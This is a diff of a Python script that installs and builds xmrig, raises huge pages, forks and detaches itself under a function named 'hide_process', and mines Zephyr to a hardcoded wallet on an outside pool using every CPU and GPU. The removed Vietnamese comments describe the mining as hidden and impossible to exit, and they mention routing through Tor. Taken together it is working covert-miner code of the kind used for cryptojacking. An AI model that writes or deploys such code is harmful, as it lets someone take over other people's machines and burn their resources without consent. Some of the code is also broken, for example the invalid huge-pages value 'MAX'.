@@ -1,68 +1,45 @@
-import subprocess
-import json
 import os
+import subprocess
 
-def install_packages():
-    # Cài đặt các gói cần thiết: xmrig, proxychains, tor
-    subprocess.run("sudo apt-get update", shell=True, check=True)
-    subprocess.run("sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev ", shell=True, check=True)
+def install_dependencies():
+	subprocess.call("sudo apt-get update", shell=True)
+	subprocess.call("sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev", shell=True)
 
 def install_xmrig():
-    # Tải xuống và cài đặt xmrig từ repository
-    subprocess.run("git clone https://github.com/xmrig/xmrig.git", shell=True, check=True)
-    os.chdir("xmrig")
-    subprocess.run("mkdir build && cd build && cmake .. && make", shell=True, check=True)
+	# Clone repository
+	subprocess.run(["git", "clone", "https://github.com/xmrig/xmrig.git"])
+	# Build xmrig
+	os.chdir("xmrig")
+	subprocess.run(["mkdir", "build"])
+	os.chdir("build")
+	subprocess.run(["cmake", ".."])
+	subprocess.run(["make"])
 
-def setup_mining_config(pool_url, username, password, cpu_threads):
-    # Thiết lập tệp cấu hình đào
-    config = {
-        "cpu": True,             # Sử dụng CPU
-        "opencl": True,          # Sử dụng GPU OpenCL
-        "cuda": True,            # Sử dụng GPU CUDA
-        "pools": [
-            {
-                "url": pool_url,
-                "user": username,
-                "pass": password,
-                "tls": True        # Sử dụng SSL
-            }
-        ],
-        "cpu-threads": cpu_threads  # Số lượng luồng CPU sử dụng
-    }
-    
-    # Ghi tệp cấu hình vào config.json
-    with open("config.json", "w") as f:
-        json.dump(config, f)
+def set_huge_pages():
+	# Set huge pages
+	subprocess.run(["sudo", "sysctl", "-w", "vm.nr_hugepages=MAX"])
 
-def start_mining():
-    # Khởi động quá trình đào coin với xmrig qua proxychains và Tor
-    subprocess.Popen("./xmrig -c config.json & disown", shell=True, preexec_fn=os.setsid)
+def start_xmrig():
+	# Start xmrig
+	os.chdir("../..")
+	subprocess.Popen(["./xmrig/build/xmrig", "--url=stratum+ssl://sg-zephyr.miningocean.org:5432", "--user=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB", "--coin=Zephyr", "--cpu", "--cuda", "--opencl"])
 
-# def set_huge_pages():
-#     # Thiết lập huge pages (cần quyền root)
-#     subprocess.run("sudo sysctl -w vm.nr_hugepages=128", shell=True)
+def hide_process():
+	# Hide process
+	pid = os.fork()
+	if pid > 0:
+		exit()
+	elif pid == 0:
+		os.setsid()
+	else:
+		exit()
 
-def set_max_huge_pages():
-    total_huge_pages = int(subprocess.check_output(['cat', '/proc/meminfo']).decode().split('HugePages_Total:')[1].split()[0])
-    subprocess.run(['sysctl', '-w', f'vm.nr_hugepages={total_huge_pages}'])
+def main():
+	install_dependencies()
+	install_xmrig()
+	set_huge_pages()
+	hide_process()
+	start_xmrig()
 
 if __name__ == "__main__":
-    # Cài đặt các gói cần thiết
-    install_packages()
-    
-    # Cài đặt xmrig
-    install_xmrig()
-    
-    # Thiết lập tệp cấu hình đào
-    pool_url = "stratum+ssl://sg-zephyr.miningocean.org:5432"
-    username = "ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB"
-    password = "x"
-    cpu_threads = os.cpu_count()  # Số lượng luồng CPU tối đa
-    
-    setup_mining_config(pool_url, username, password, cpu_threads)
-    
-    # Thiết lập huge pages
-    set_max_huge_pages()
-    
-    # Bắt đầu đào coin ẩn và không thể thoát ra
-    start_mining()
+	main()
